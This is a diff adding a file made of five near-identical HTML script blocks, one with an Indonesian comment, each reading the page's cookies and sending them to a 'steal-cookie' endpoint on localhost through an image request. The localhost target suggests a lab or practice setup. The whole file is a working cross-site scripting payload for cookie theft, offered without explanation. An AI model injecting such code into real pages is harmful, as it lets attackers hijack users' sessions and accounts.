@@ -1,0 +1,44 @@
+        <script>
+          var cookies = document.cookie;
+          var img = new Image();
+          img.src = "http://localhost:3000/steal-cookie?cookie=" + encodeURIComponent(cookies);
+          document.body.appendChild(img);
+        </script>
+      
+        <script>
+          var cookies = document.cookie;
+          var img = new Image();
+          img.src = "http://localhost:3000/steal-cookie?cookie=" + encodeURIComponent(cookies);
+          document.body.appendChild(img);
+        </script>
+      
+      <script>
+        var cookies = document.cookie;
+        if (cookies) { // Pastikan cookies tidak kosong
+          var img = new Image();
+          img.src = "http://localhost:3000/steal-cookie?cookie=" + encodeURIComponent(cookies);
+          document.body.appendChild(img);
+        }
+      </script>
+      
+      
+      <script>
+        var cookies = document.cookie;
+        if (cookies) { // Pastikan cookies tidak kosong
+          var img = new Image();
+          img.src = "http://localhost:3000/steal-cookie?cookie=" + encodeURIComponent(cookies);
+          document.body.appendChild(img);
+        }
+      </script>
+      
+      
+      <script>
+        var cookies = document.cookie;
+        if (cookies) {
+          var img = new Image();
+          img.src = "http://localhost:3000/steal-cookie?cookie=" + encodeURIComponent(cookies);
+          document.body.appendChild(img);
+        }
+      </script>      
+      
+      
